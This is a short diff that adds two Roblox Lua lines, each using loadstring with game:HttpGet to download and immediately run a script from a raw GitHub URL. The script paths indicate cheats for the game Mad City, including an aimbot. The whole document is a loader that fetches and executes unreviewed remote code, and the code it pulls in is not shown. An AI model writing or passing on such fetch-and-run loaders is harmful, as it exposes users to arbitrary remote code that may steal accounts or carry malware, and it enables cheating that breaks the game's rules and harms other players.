@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qo0wSc7681/allfunct/main/madcity2"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/qo0wSc7681/madcity/main/aimbot'))()
